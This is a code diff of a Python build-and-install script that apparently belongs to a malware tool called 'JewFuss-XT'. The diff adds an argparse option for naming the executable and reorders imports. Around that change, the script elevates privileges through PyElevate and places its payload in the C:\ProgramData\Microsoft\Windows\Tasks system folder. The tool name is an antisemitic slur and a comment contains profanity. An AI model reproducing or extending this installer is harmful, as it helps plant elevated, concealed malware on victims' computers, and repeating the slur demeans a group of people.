@@ -1,13 +1,17 @@
-import os
-import shutil
-import sys
 import subprocess
 import PyElevate
-import time
+import argparse
 import psutil
+import shutil
+import time
+import sys
+import os
 
 target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want, as long as it will be able to access it
 printnonerrors = False
+
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+os.chdir(SCRIPT_DIR)
 
 # running as .py will just compile it, the uncompiled version does not work
 
@@ -22,8 +26,16 @@ printnonerrors = False
 
 try:
     if os.path.splitext(sys.argv[0])[1].lower() == ".py":  # Compile if running as .py
-        app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
-
+        parser = argparse.ArgumentParser()
+        parser.add_argument('--file', type=str, default=None)
+        args = parser.parse_args()
+        
+        if args.file == None:
+            app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
+        else:
+            print(f'Using provided file: "{args.file}"')
+            app_name = args.file
+            
         if not app_name:
             app_name = "JewFuss-XT.exe"
 
